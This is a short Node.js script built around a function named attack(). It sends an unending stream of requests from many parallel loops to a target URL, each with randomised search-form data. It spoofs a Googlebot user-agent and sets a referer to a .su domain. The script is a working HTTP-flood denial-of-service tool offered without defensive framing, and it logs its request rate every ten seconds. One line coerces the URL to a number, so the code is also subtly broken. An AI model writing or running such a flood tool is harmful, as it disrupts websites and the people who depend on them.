const request = require('request');
const fs = require('fs');
const qs = require('querystring');
const _ = require('underscore');

const _url = +process.argv[process.argv.length - 2];
const threadsCount = +process.argv[process.argv.length - 1];

const headers = {
  'user-agent': ' Googlebot/2.1 (+http://www.google.com/bot.html)',
  accept: 'text/html',
  referer: 'http://antiukrop.su/to_send_data'
};

var count = 0;

setInterval(function () {
  console.log(count + ' # ', new Date().toLocaleString());
  count = 0;
}, 10000);

function generate() {
  const chucks = [];
  for (let i = 0; i < _.random(1, 10); i++) {
    chucks.push(_.random(1, Number.MAX_SAFE_INTEGER).toString(36))
  }
  return chucks.join(' ');
}

function attack() {
  const data = qs.encode({
    do: 'search',
    subaction: 'search',
    story: generate()
  });
  const options = {
    form: data,
    headers: headers
  };
  request(_url, options, function (err, res) {
    count++;
    if (err || 200 !== res.statusCode) {
      console.error(err || res.statusCode)
    }
    attack();
  })
}

for (let i = 0; i < threadsCount; i++) {
  setTimeout(attack, i * 20);
}
